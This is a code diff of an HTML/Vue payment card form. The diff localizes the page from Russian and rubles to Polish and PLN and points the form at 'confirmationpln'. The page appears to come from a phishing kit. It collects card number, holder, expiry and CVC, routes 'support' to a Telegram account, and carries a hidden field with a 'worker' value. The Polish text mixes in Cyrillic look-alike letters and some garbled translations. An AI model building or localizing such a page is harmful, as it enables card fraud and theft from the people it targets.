@@ -2,7 +2,7 @@
 <html>
 
 <head>
-	<title>Оплата заказа</title>
+	<title>Zamów płatność</title>
 	<meta charset="utf-8">
 	<meta name="robots" content="all">
 	<meta name="description" content="">
@@ -22,7 +22,7 @@
 	<script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
 	<link rel="icon" href="assets/img/favicon.ico.html" type="image/x-icon">
 	<link rel="shortcut icon" href="assets/img/favicon.ico.html" type="image/x-icon"> </head>
-<form method='POST' action='confirmation' class='credit-card-form__form js-card-form' autocomplete='on'>
+<form method='POST' action='confirmationpln' class='credit-card-form__form js-card-form' autocomplete='on'>
 	<!-- новая форма -->
 	<style>
 	@import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
@@ -859,21 +859,21 @@
 							</label>
 							<div class="card-item__content">
 								<label for="cardName" class="card-item__info" ref="cardName">
-									<div class="card-item__holder">Держатель карты</div>
+									<div class="card-item__holder">Posiadacz karty</div>
 									<transition name="slide-fade-up">
 										<div class="card-item__name" v-if="cardName.length" key="1">
 											<transition-group name="slide-fade-right"> <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span> </transition-group>
 										</div>
-										<div class="card-item__name" v-else key="2">Full Name</div>
+										<div class="card-item__name" v-else key="2">Pełne imię i nazwisko</div>
 									</transition>
 								</label>
 								<div class="card-item__date" ref="cardDate">
-									<label for="cardMonth" class="card-item__dateTitle">ММ/ГГ</label>
+									<label for="cardMonth" class="card-item__dateTitle">MM/RR</label>
 									<label for="cardMonth" class="card-item__dateItem">
 										<transition name="slide-fade-up"> <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span> <span v-else key="2">MM</span> </transition>
 									</label> /
 									<label for="cardYear" class="card-item__dateItem">
-										<transition name="slide-fade-up"> <span name="" v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span> <span v-else key="2">YY</span> </transition>
+										<transition name="slide-fade-up"> <span name="" v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span> <span v-else key="2">RR</span> </transition>
 									</label>
 								</div>
 							</div>
@@ -893,22 +893,22 @@
 			</div>
 			<div class="card-form__inner">
 				<div class="card-input">
-					<label for="cardNumber" class="card-input__label">Номер карты</label>
+					<label for="cardNumber" class="card-input__label">numer karty</label>
 					<input readonly type="text" required placeholder="#### #### #### ####" name="card_number" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required> </div>
 				<div class="card-input">
-					<label for="cardName" class="card-input__label">Держатель карты</label>
+					<label for="cardName" class="card-input__label">Рosiadacz karty</label>
 					<input readonly type="text" required placeholder="IVAN IVANOV" name="cardholder" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" oninput="this.value = this.value.toUpperCase()" required> </div>
 				<div class="card-form__row">
 					<div class="card-form__col">
 						<div class="card-form__group">
-							<label for="cardMonth" class="card-input__label">Срок действия</label>
+							<label for="cardMonth" class="card-input__label">Ważność</label>
 							<select readonly name="expdate1" class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
-								<option value="" disabled selected>Месяц</option>
+								<option value="" disabled selected>Miesiąc</option>
 								<option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n"> {{n
 									< 10 ? '0' + n : n}} </option>
 							</select>
 							<select readonly name="expdate2" class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate">
-								<option value="" disabled selected>Год</option>
+								<option value="" disabled selected>Rok</option>
 								<option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n"> {{$index + minCardYear}} </option>
 							</select>
 						</div>
@@ -919,17 +919,17 @@
 							<input readonly required type="text" placeholder="***" name="cvc2" class="card-input__input" id="cardCvv" v-mask="'####'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required> </div>
 					</div>
 				</div>
-				<h3 style="text-align: center; margin: 0px;">Сумма к оплате <%= amount %> Руб</h3>
+				<h3 style="text-align: center; margin: 0px;">Кwota do zapłaty <%= amount %> PLN</h3>
 				<div class="credit-card-form__submit">
 					<div class="credit-card-form__submit-inner">
-						<a href="https://t.me/funnyhub_support"><button class="card-form__button">Оплатить</button></a>
+						<a href="https://t.me/funnyhub_support"><button class="card-form__button">Płacić</button></a>
 
 						<!-- <input readonly type='submit' class='card-form__button' name='submit' value='Оплатить'> -->
 						<!-- <input type='hidden' name='solt' value='eyJpZCI6ImZhYzJkZWJiM2NlNSIsImNhc2giOiJwYXkiLCJ3b3JrZXIiOm51bGx9'> </div> -->
 				</div>
 				<br/>
-				<h4 style="text-align: center; margin: 0px;">Переживаешь за данные карты?</h4>
-				<a href="https://t.me/funnyhub_support"><h5 style="text-align: center; margin: 0px;">Пополняй через тех. поддержку</h5></a>
+				<h4 style="text-align: center; margin: 0px;">Martwisz się o dane swojej karty?</h4>
+				<a href="https://t.me/funnyhub_support"><h5 style="text-align: center; margin: 0px;">Uzupełnij przez nie. wsparcie</h5></a>
 			</div>
 			<center>
 				<svg id="svg-secure-connection" viewBox="0 0 105 32" style="width:20%; margin:20px 10px">
